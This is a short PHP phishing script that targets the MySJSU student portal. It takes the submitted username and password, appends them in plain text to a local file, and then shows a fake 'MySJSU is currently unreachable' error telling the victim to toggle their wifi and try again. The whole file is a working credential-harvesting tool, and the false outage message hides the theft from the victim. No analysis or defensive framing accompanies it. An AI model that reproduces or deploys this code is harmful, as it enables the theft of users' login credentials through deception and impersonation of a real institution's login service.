<?php
/**
 * Created by PhpStorm.
 * User: lschubert
 * Date: 11/27/15
 * Time: 11:19 AM
 */

$name = filter_input(INPUT_POST, "userid");
$password = filter_input(INPUT_POST, "pwd");
//print 'hello';
//print $name;
//print $password;
//$currentTime =  date("Y-m-d@H:i:s");
$myFile = "UserData.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "Username: $name\n";
fwrite($fh, $stringData);
$stringData = "Password: $password\n";
fwrite($fh, $stringData);
fclose($fh);
?>
<html>
<head>
    <link rel="stylesheet" href="style.css" rel="stylesheet" type="text/css">
    <style type="text/css">
        <!--
        a:link {
            color: #48598c;
        }
        a:visited {
            color: #48598C;
        }
        a:hover {
            color: #48598C;
        }
        a:active {
            color: #48598C;
        }
        body {
            margin-left: 0px;
            margin-top: 0px;
            margin-right: 0px;
            margin-bottom: 0px;
        }
        -->
        window.history.forward(1);
    </style>
</head>
<body>
<h1>
    MySJSU is currently unreachable.
</h1>
<h1>
    Please turn your wifi on and off and try again.
</h1>
<h2>
    Sorry for the Inconvenience.
</h2>
</body>
</html>
